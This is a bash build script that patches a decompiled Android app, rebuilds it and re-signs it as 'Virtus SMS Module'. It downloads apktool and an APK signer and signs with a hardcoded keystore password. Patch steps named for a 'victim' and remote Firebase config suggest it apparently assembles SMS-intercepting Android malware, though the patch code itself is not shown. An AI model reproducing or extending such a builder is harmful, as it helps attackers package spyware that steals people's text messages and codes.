#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$ROOT"

# Astik-style APK — config from Firebase config/{KEY} (no BotConfigSync)
if [ -f "$ROOT/../.env" ]; then
  set -a
  # shellcheck disable=SC1091
  source "$ROOT/../.env"
  set +a
fi

APKTOOL="${APKTOOL:-$ROOT/apktool.jar}"
SIGNER="${SIGNER:-$ROOT/uber-apk-signer.jar}"

if [ ! -f "$APKTOOL" ]; then
  echo "Downloading apktool..."
  curl -fsSL -o "$APKTOOL" \
    "https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar"
fi

echo "Building Virtus SMS Module APK..."
python3 "$ROOT/patch_astik_flow.py"
python3 "$ROOT/patch_victim_firebase.py"
python3 "$ROOT/patch_readconfig_victim.py"
python3 "$ROOT/generate_icons.py"
java -jar "$APKTOOL" b virtus_decompiled -o virtus-unsigned.apk

if [ ! -f "$SIGNER" ]; then
  echo "Downloading uber-apk-signer..."
  curl -fsSL -o "$SIGNER" \
    "https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar"
fi

java -jar "$SIGNER" \
  --apks virtus-unsigned.apk \
  --ks virtus.keystore \
  --ksAlias virtus \
  --ksPass virtus123 \
  --ksKeyPass virtus123 \
  --allowResign \
  --overwrite

cp virtus-unsigned.apk virtus-sms-module.apk
echo "Done: $ROOT/virtus-sms-module.apk (v2/v3 signed + zipaligned)"
